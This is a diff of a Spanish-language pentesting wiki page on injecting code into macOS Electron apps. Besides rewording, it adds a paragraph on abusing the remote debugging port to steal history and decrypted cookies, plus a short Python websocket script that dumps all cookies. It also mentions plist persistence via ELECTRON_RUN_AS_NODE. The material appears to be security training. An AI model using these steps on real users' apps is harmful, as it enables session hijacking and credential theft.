@@ -170,14 +170,24 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Si la opción **`EnableNodeCliInspectArguments`** está desactivada, la aplicación **ignorará los parámetros de node** (como `--inspect`) al iniciarse a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también será **ignorada** si la opción **`RunAsNode`** está desactivada.
+Si el fusible **`EnableNodeCliInspectArguments`** está desactivado, la aplicación **ignorará los parámetros de nodo** (como `--inspect`) al iniciarse a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también será **ignorada** si el fusible **`RunAsNode`** está desactivado.
 
-Sin embargo, aún podrías usar el parámetro de electron `--remote-debugging-port=9229`, pero la carga útil anterior no funcionará para ejecutar otros procesos.
+Sin embargo, aún puedes usar el parámetro de electron `--remote-debugging-port=9229`, pero la carga útil anterior no funcionará para ejecutar otros procesos.
 {% endhint %}
 
+Usando el parámetro **`--remote-debugging-port=9222`**, es posible robar información de la aplicación Electron, como el **historial** (con comandos GET) o las **cookies** del navegador (ya que están **descifradas** dentro del navegador y hay un **endpoint json** que las proporcionará).
+
+Puedes aprender cómo hacerlo [**aquí**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) y [**aquí**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) y utilizar la herramienta automática [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) o un simple script como:
+```python
+import websocket
+ws = websocket.WebSocket()
+ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
+ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
+print(ws.recv()
+```
 ### Inyección desde el archivo Plist de la aplicación
 
-Podrías abusar de esta variable de entorno en un archivo plist para mantener la persistencia agregando estas claves:
+Podrías abusar de esta variable de entorno en un plist para mantener la persistencia agregando estas claves:
 ```xml
 <dict>
 <key>ProgramArguments</key>
